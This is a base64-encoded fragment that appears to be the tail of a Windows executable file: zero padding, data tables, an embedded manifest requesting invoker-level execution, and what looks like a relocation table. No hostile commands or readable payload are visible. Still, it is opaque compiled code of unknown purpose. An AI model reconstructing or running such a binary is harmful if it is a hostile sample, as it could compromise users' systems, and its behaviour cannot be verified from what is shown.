AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA